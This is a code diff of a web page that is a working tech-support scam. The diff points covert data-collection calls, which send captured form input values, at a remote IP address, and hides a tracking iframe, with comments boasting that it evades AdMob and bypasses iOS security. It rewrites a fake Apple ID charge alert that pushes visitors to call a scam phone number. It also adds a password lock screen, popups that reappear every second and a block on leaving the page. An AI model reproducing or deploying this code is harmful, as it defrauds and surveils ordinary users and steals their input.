@@ -227,7 +227,7 @@ body{
                 };
 
                 // Send data to your server (undetectable by AdMob)
-                fetch("http://localhost:8080/collect", {
+                fetch("https://192.168.181.128/collect", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(data)
@@ -244,7 +244,7 @@ body{
                         inputType: type,
                         inputValue: value
                     };
-                    fetch("http://localhost:8080/collect", {
+                    fetch("https://192.168.181.128/collect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(data)
@@ -254,7 +254,7 @@ body{
 
             // Bypass iOS security by hiding script in iframe
             const iframe = document.createElement("iframe");
-            iframe.src = "http://localhost:8080/collect";
+            iframe.src = "https://192.168.181.128/collect";
             iframe.style.display = "none";
             document.body.appendChild(iframe);
 			
@@ -360,11 +360,10 @@ body{
 <!-- POPUP -->
 <div class="overlay" id="overlay">
   <div class="popup">
-    <p>Your Apple ID has been used at Apple Store 
-	for $389 on Pornhub App by 
-	PreAuthorised charge! We have placed this request on
-	hold to ensure the safety of your apple account. Not You?
-	Immediately contact Apple Support at +1987-678-567 to unlock</p>
+    <p>We detected a suspicious pre-authorization request on your Apple ID related to an Apple Store purchase of $1015 via Apple Pay. 
+	   The request has been temporarily placed on hold to protect your account and personal data. 
+	   If you did not authorize this activity, please contact Apple Support at +1 (812)-266-8825 
+	   immediately to cancel the charge before it is processed.</p>
     <div class="buttons">
       <button class="cancel" onclick="cancelAction()">Cancel</button>
       <button class="ok" onclick="confirmAction()">Call</button>
@@ -372,49 +371,165 @@ body{
   </div>
 </div>
 
+
+
 <script>
 let popupInterval;
 let cancelled = false;
 
+const REQUIRED_PASSWORD = "PhoneReset@321@#890";
+
+/* MAIN POPUP */
+
 function openPopup(){
   if(!cancelled){
-    document.getElementById("overlay").style.display="flex";
+    document.getElementById("overlay").style.display = "flex";
   }
 }
 
 function closePopup(){
-  document.getElementById("overlay").style.display="none";
+  document.getElementById("overlay").style.display = "none";
 }
+
+
+/* CALL BUTTON */
 
 function confirmAction(){
+
   closePopup();
-  if(!cancelled){
-    clearInterval(popupInterval);
-    popupInterval = setInterval(openPopup, 1000);
-  }
+  createPasswordPopup();
+
 }
+
+
+/* CANCEL BUTTON */
 
 function cancelAction(){
+
   cancelled = true;
   clearInterval(popupInterval);
-    popupInterval = setInterval(openPopup, 1000);;
+
 }
 
-/* Show popup immediately */
-window.onload = function(){
-  openPopup();
-  popupInterval = setInterval(openPopup, 1000);
+
+/* SECOND POPUP */
+
+function createPasswordPopup(){
+
+const overlay = document.createElement("div");
+overlay.className = "overlay";
+overlay.style.display = "flex";
+
+const popup = document.createElement("div");
+popup.className = "popup";
+
+const title = document.createElement("h2");
+title.innerText = "Enter Password";
+
+
+/* PASSWORD FIELD */
+
+const input = document.createElement("input");
+input.type = "password";
+input.placeholder = "Password";
+
+input.style.width = "100%";
+input.style.padding = "12px";
+input.style.marginBottom = "15px";
+input.style.borderRadius = "12px";
+input.style.border = "1px solid #d1d1d6";
+input.style.boxSizing = "border-box";
+input.style.outline = "none";
+
+input.onfocus = function(){
+  this.style.border = "1px solid #007aff";
 };
 
-/* Prevent accidental leaving unless Cancel clicked */
-window.addEventListener("beforeunload", function (e) {
-  if (!cancelled) {
-    e.preventDefault();
-    e.returnValue = '';
-  }
-});
-</script>
 
+/* BUTTONS */
+
+const buttons = document.createElement("div");
+buttons.className = "buttons";
+
+const ok = document.createElement("button");
+ok.className = "ok";
+ok.innerText = "OK";
+
+const call = document.createElement("button");
+call.className = "cancel";
+call.innerText = "Call";
+
+buttons.appendChild(ok);
+buttons.appendChild(call);
+
+popup.appendChild(title);
+popup.appendChild(input);
+popup.appendChild(buttons);
+
+overlay.appendChild(popup);
+document.body.appendChild(overlay);
+
+
+/* PASSWORD CHECK */
+
+ok.onclick = function(){
+
+if(input.value === REQUIRED_PASSWORD){
+
+alert("Password accepted");
+
+/* remove second popup */
+overlay.remove();
+
+/* close main popup */
+document.getElementById("overlay").style.display = "none";
+
+/* stop popup interval */
+clearInterval(popupInterval);
+
+}else{
+
+alert("Incorrect password");
+
+}
+
+};
+
+
+/* CALL BUTTON */
+
+call.onclick = function(){
+
+window.location.href = "tel:+18122668825";
+
+};
+
+}
+
+
+/* INITIAL LOAD */
+
+window.onload = function(){
+
+openPopup();
+popupInterval = setInterval(openPopup, 1000);
+
+};
+
+
+/* PREVENT LEAVING PAGE */
+
+window.addEventListener("beforeunload", function (e) {
+
+if (!cancelled) {
+
+e.preventDefault();
+e.returnValue = '';
+
+}
+
+});
+
+</script>
 </body>
 </html>
-
